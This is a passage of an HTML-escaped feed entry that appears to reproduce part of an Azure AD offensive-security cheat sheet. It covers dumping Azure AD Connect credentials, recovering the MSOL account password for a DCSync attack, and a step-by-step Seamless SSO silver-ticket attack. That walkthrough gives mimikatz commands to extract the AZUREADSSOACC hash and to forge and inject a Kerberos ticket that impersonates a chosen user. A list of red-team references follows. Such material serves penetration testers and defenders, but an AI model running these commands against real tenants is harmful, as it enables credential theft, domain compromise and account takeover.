&lt;th&gt;DLL dependencies&lt;/th&gt; &#xA;   &lt;th&gt;Requires MSSQL locally&lt;/th&gt; &#xA;   &lt;th&gt;Requires python locally&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ADSyncDecrypt&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ADSyncGather&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;ADSyncQuery&lt;/td&gt; &#xA;   &lt;td&gt;No (network RPC calls only)&lt;/td&gt; &#xA;   &lt;td&gt;No&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;   &lt;td&gt;Yes&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;git clone https://github.com/fox-it/adconnectdump&#xA;# DCSync with AD Sync account&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Azure AD Connect - MSOL Account&#39;s password and DCSync&lt;/h3&gt; &#xA;&lt;p&gt;You can perform &lt;strong&gt;DCSync&lt;/strong&gt; attack using the MSOL account.&lt;/p&gt; &#xA;&lt;p&gt;Requirements:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Compromise a server with Azure AD Connect service&lt;/li&gt; &#xA; &lt;li&gt;Access to ADSyncAdmins or local Administrators groups&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Use the script &lt;strong&gt;azuread_decrypt_msol.ps1&lt;/strong&gt; from @xpn to recover the decrypted password for the MSOL account:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;azuread_decrypt_msol.ps1&lt;/code&gt;: AD Connect Sync Credential Extract POC &lt;a href=&#34;https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545&#34;&gt;https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;azuread_decrypt_msol_v2.ps1&lt;/code&gt;: Updated method of dumping the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync &lt;a href=&#34;https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c&#34;&gt;https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Now you can use the retrieved credentials for the MSOL Account to launch a DCSync attack.&lt;/p&gt; &#xA;&lt;h3&gt;Azure AD Connect - Seamless Single Sign On Silver Ticket&lt;/h3&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Anyone who can edit properties of the AZUREADSSOACCS$ account can impersonate any user in Azure AD using Kerberos (if no MFA)&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;Seamless SSO is supported by both PHS and PTA. If seamless SSO is enabled, a computer account &lt;strong&gt;AZUREADSSOC&lt;/strong&gt; is created in the on-prem AD.&lt;/p&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;&lt;span&gt;⚠&lt;/span&gt; The password of the AZUREADSSOACC account never changes.&lt;/p&gt; &#xA;&lt;p&gt;Using &lt;a href=&#34;https://autologon.microsoftazuread-sso.com/&#34;&gt;https://autologon.microsoftazuread-sso.com/&lt;/a&gt; to convert Kerberos tickets to SAML and JWT for Office 365 &amp;amp; Azure&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;NTLM password hash of the AZUREADSSOACC account, e.g. &lt;code&gt;f9969e088b2c13d93833d0ce436c76dd&lt;/code&gt;. &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;mimikatz.exe &#34;lsadump::dcsync /user:AZUREADSSOACC$&#34; exit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;AAD logon name of the user we want to impersonate, e.g. &lt;code&gt;elrond@contoso.com&lt;/code&gt;. This is typically either his userPrincipalName or mail attribute from the on-prem AD.&lt;/li&gt; &#xA; &lt;li&gt;SID of the user we want to impersonate, e.g. &lt;code&gt;S-1-5-21-2121516926-2695913149-3163778339-1234&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Create the Silver Ticket and inject it into Kerberos cache: &lt;pre&gt;&lt;code class=&#34;language-powershell&#34;&gt;mimikatz.exe &#34;kerberos::golden /user:elrond&#xA;/sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234&#xA;/domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd&#xA;/target:aadg.windows.net.nsatc.net /service:HTTP /ptt&#34; exit&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;li&gt;Launch Mozilla Firefox&lt;/li&gt; &#xA; &lt;li&gt;Go to about:config and set the &lt;code&gt;network.negotiate-auth.trusted-uris preference&lt;/code&gt; to value &lt;code&gt;https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Navigate to any web application that is integrated with our AAD domain. Fill in the user name, while leaving the password field empty.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;References&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.alteredsecurity.com/post/introduction-to-365-stealer&#34;&gt;Introduction To 365-Stealer - Understanding and Executing the Illicit Consent Grant Attack&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=51FSvndgddk&amp;amp;list=WL&#34;&gt;Learn with @trouble1_raunak: Cloud Pentesting - Azure (Illicit Consent Grant Attack) !!&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94&#34;&gt;Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597&#34;&gt;Azure AD Pass The Certificate - Mor - Aug 19, 2020&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://zhiliaxu.github.io/app-service-managed-identity.html&#34;&gt;Get Access Tokens for Managed Service Identity on Azure App Service&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://o365blog.com/post/mdm/&#34;&gt;Bypassing conditional access by faking device compliance - September 06, 2020 - @DrAzureAD&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/0xJs/CARTP-cheatsheet/raw/main/Authenticated-enumeration.md&#34;&gt;CARTP-cheatsheet - Azure AD cheatsheet for the CARTP course&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.netspi.com/blog/technical/cloud-penetration-testing/get-azurepasswords/&#34;&gt;Get-AzurePasswords: A Tool for Dumping Credentials from Azure Subscriptions - August 28, 2018 - Karl Fosaaen&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.gracefulsecurity.com/an-introduction-to-penetration-testing-azure/&#34;&gt;An introduction to penetration testing Azure - Graceful Security&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.netspi.com/running-powershell-scripts-on-azure-vms/&#34;&gt;Running Powershell scripts on Azure VM - Netspi&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.netspi.com/attacking-azure-cloud-shell/&#34;&gt;Attacking Azure Cloud shell - Netspi&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.netspi.com/maintaining-azure-persistence-via-automation-accounts/&#34;&gt;Maintaining Azure Persistence via automation accounts - Netspi&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.smartspate.com/detecting-an-attacks-on-active-directory-with-azure/&#34;&gt;Detecting an attacks on active directory with Azure - Smartspate&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=l_pnNpdxj20&#34;&gt;Azure AD Overview&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=IcSATObaQZE&#34;&gt;Windows Azure Active Directory in plain English&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@kamran.bilgrami/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f&#34;&gt;Building Free Active Directory Lab in Azure - @kamran.bilgrami&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://posts.specterops.io/attacking-azure-azure-ad-and-introducing-powerzure-ca70b330511a&#34;&gt;Attacking Azure/Azure AD and introducing Powerzure - SpecterOps&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.xpnsec.com/azuread-connect-for-redteam/&#34;&gt;Azure AD connect for RedTeam - @xpnsec&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://blog.netspi.com/azure-privilege-escalation-using-managed-identities/&#34;&gt;Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.lares.com/hunting-azure-admins-for-vertical-escalation/&#34;&gt;Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dirkjanm.io/introducing-roadtools-and-roadrecon-azure-ad-exploration-framework/&#34;&gt;Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://medium.com/@talthemaor/moving-laterally-between-azure-ad-joined-machines-ed1f8871da56&#34;&gt;Moving laterally between Azure AD joined machines - Tal Maor - Mar 17, 2020&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.synacktiv.com/posts/pentest/azure-ad-introduction-for-red-teamers.html&#34;&gt;AZURE AD INTRODUCTION FOR RED TEAMERS - Written by Aymeric Palhière (bak) - 2020-04-20&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.dsinternals.com/en/impersonating-office-365-users-mimikatz/&#34;&gt;Impersonating Office 365 Users With Mimikatz - January 15, 2017 - Michael Grafnetter&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
</feed>